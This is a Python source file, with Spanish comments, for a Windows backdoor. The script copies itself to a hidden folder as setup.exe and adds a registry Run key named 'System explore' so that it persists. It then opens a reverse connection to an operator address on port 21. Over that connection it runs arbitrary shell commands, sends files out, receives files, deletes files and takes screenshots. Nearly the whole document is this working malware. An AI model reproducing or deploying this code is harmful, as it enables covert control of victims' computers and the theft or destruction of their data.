

import sys
import socket
import subprocess
import traceback
import time
import os
from PIL import ImageGrab
import shutil
import winreg

dist = ""
curntfile = sys.argv[0]  # nombre del archivo actual
servername = "/setup.exe"
username = os.getenv('USERNAME')

if os.path.exists("C:/Documents and Settings/" + username):  # usuarios de XP
    dist = "C:/Documents and Settings/" + username + "/regky"
    print("Ruta encontrada:", dist)
    if not os.path.isdir(dist):  # moviendo el archivo a un nuevo directorio
        os.mkdir(dist)
    try:
        shutil.copy2(curntfile, dist + servername)
        print("Archivo copiado a:", dist + servername)
        aReg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        aKey = winreg.OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(aKey, "System explore", 0, winreg.REG_SZ, "C:\\Documents and Settings\\" + username + "\\regky\\setup.exe")
        print("Clave de registro agregada:", "C:\\Documents and Settings\\" + username + "\\regky\\setup.exe")
    except Exception as e:
        print("Error al copiar el archivo y agregar la clave de registro:", e)

elif os.path.exists("C:/Users/" + username):  # para Windows 7
    dist = "C:/Users/" + username + "/regky"
    print("Ruta encontrada:", dist)
    if not os.path.isdir(dist):  # moviendo el archivo a un nuevo directorio
        os.mkdir(dist)
    try:
        shutil.copy2(curntfile, dist + servername)
        print("Archivo copiado a:", dist + servername)
        aReg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        aKey = winreg.OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(aKey, "System explore", 0, winreg.REG_SZ, "C:\\Users\\" + username + "\\regky\\setup.exe")
        print("Clave de registro agregada:", "C:\\Users\\" + username + "\\regky\\setup.exe")
    except Exception as e:
        print("Error al copiar el archivo y agregar la clave de registro:", e)


def do_work(forever=True):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5.0)

            x = s.getsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE)
            if x == 0:
                print('Activando el Keepalive del Socket')
                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            else:
                print('Keepalive del Socket ya activado')

            try:
                s.connect(('192.168.0.177', 21))  # TU IP Y PUERTO PARA LA CONEXIÓN INVERSA
            except socket.error:
                print('¡Fallo al conectar el socket! Reintentando la conexión.')
                time.sleep(10)
                continue

            print('¡Conexión al socket exitosa!')

            while True:
                try:
                    data = s.recv(1024)
                    if data == b"quit":
                        break
                    elif data.startswith(b'download'):
                        sendFile = data[9:].decode()
                        time.sleep(.5)
                        if os.path.isfile(sendFile):
                            with open(sendFile, 'rb') as f:
                                while True:
                                    filedata = f.read()
                                    if not filedata:
                                        break
                                    s.sendall(filedata)
                            time.sleep(0.8)
                            s.sendall(b'EOFEOFX')
                        else:
                            s.sendall(b'invalid filename')
                    elif data.startswith(b'invalid'):
                        s.sendall(b'Invalid filename')
                    elif data.startswith(b'del'):
                        filename = data[4:].decode()
                        try:
                            os.remove(filename)
                            s.sendall(b'Deleted')
                        except OSError:
                            s.sendall(b'Invalid filename')
                    elif data.startswith(b'cd'):
                        path = data[3:].decode()
                        try:
                            os.chdir(path)
                            s.sendall(os.getcwd().encode())
                        except FileNotFoundError:
                            s.sendall(b"path not found")
                    elif data.startswith(b'pic'):
                        image = data[4:].decode()
                        ImageGrab.grab().save(image, "PNG")
                        s.sendall(b'image saved')
                    elif data.startswith(b"upload"):
                        downFile = data[7:].decode()
                        try:
                            with open(downFile, 'wb') as f:
                                while True:
                                    l = s.recv(1024)
                                    if l.endswith(b'EOFEOFX'):
                                        f.write(l[:-7])
                                        break
                                    else:
                                        f.write(l)
                            s.sendall(b'Done')
                        except Exception as e:
                            pass
                    else:
                        proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        stdout_value = proc.stdout.read() + proc.stderr.read()
                        if len(stdout_value) == 0:
                            s.sendall(b"Command successful")
                        else:
                            s.sendall(stdout_value)

                except socket.timeout:
                    print('Tiempo de espera del socket, volviendo a intentar recv()')
                    time.sleep(0)
                    continue

                except Exception as e:
                    traceback.print_exc()
                    print('Error de socket, cerrando y volviendo a crear el socket.')
                    break

        finally:
            try:
                s.close()
            except:
                pass


if __name__ == '__main__':
    do_work(True)


